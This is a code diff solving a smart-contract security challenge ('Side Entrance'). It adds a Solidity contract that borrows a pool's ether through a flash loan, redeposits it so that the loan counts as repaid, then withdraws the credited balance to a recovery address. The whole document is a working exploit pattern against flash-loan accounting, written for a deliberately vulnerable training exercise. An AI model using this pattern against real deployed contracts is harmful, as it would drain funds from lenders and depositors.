@@ -45,7 +45,9 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        MyIFlashLoanEtherReceiver loanReceiver = new MyIFlashLoanEtherReceiver(address(pool), payable(recovery));
+        loanReceiver.callFlashLoan(ETHER_IN_POOL);
+        loanReceiver.withdraw();
     }
 
     /**
@@ -56,3 +58,29 @@ contract SideEntranceChallenge is Test {
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
     }
 }
+
+    contract MyIFlashLoanEtherReceiver {
+        SideEntranceLenderPool pool;
+        address payable recovery;
+        
+        constructor(address _pool, address payable _recovery) {
+            recovery = _recovery;
+            pool = SideEntranceLenderPool(_pool);
+        }
+
+        function callFlashLoan(uint256 amount) external {
+            pool.flashLoan(amount);
+        }
+
+        function execute() external payable {
+            pool.deposit{value: msg.value}();
+        }
+
+        function withdraw() public {
+            pool.withdraw();
+            (bool success, ) = recovery.call{value: address(this).balance}("");
+        }
+
+        receive() external payable {}
+
+    }
